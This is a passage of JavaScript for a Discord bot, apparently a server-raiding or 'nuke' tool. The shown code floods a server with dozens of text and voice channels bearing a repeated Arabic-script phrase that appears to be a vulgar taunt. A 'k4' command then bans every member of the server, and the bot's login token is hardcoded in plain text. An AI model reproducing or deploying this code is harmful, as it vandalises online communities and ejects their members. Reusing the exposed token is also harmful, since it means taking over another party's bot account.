message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');

message.guild.createChannel('نايكم مهستر', 'voice');
message.guild.createChannel('نايكم مهستر', 'voice');
message.guild.createChannel(' نايكم مهستر', 'voice');
message.guild.createChannel('نايكم مهستر', 'voice');
message.guild.createChannel(' نايكم مهستر', 'voice');
message.guild.createChannel(' نايكم مهستر', 'voice');
message.guild.createChannel(' نايكم مهستر', 'voice');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر ', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكمم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكممهستر', 'text');
message.guild.createChannel(' نايكم مهستر ', 'text');
message.guild.createChannel(' نايكم مهستر' , 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');

}

});

LOka.on('message', message => {
         if (message.content === "k4") {
     if(!message.channel.guild) return;
     
      message.guild.members.forEach( member => {
          
          member.ban()
      })
}
});



LOka.login("NTQ2ODE0MjY1MzU3NzYyNTY2.D0tsGw.JKRm8UvLm2vXdU8Q0wwsBCfZO4A")
